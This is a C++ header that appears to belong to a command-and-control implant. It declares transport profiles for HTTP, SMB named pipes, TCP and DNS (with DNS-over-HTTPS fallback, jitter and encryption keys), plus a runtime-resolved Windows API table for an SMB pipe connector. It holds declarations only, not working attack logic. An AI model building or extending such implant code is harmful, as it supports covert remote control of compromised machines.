#pragma once

#include <windows.h>
#include "Connector.h"
#include <aclapi.h>

#define _NO_NTDLL_CRT_
#include "ntdll.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

#define DNS_MODE_UDP           0
#define DNS_MODE_DOH           1
#define DNS_MODE_UDP_FALLBACK  2
#define DNS_MODE_DOH_FALLBACK  3

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* doh_resolvers;
	BYTE* qtype;
	ULONG pkt_size;
	ULONG label_size;
	ULONG ttl;
	BYTE* encrypt_key;
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;
	BYTE* user_agent;
} ProfileDNS;
#endif

#define DECL_API(x) decltype(x) * x

struct SMBFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(ReadFile);
	DECL_API(WriteFile);

	DECL_API(NtClose);

	//kernel32
	DECL_API(ConnectNamedPipe);
	DECL_API(DisconnectNamedPipe);
	DECL_API(CreateNamedPipeA);
	DECL_API(FlushFileBuffers);
	DECL_API(PeekNamedPipe);

	//advapi32
	DECL_API(AllocateAndInitializeSid);
	DECL_API(InitializeSecurityDescriptor);
	DECL_API(FreeSid);
	DECL_API(SetEntriesInAclA);
	DECL_API(SetSecurityDescriptorDacl);
};

typedef struct _ConnectorSMBData {
	CHAR* pipename;

	BYTE* recvData;
	int   recvSize;
	ULONG allocaSize;

	SMBFUNC* functions;

	HANDLE hChannel;

	BYTE* beat;
	ULONG beatSize;
	BOOL  connected;
} ConnectorSMBData;

Connector* CreateConnectorSMB();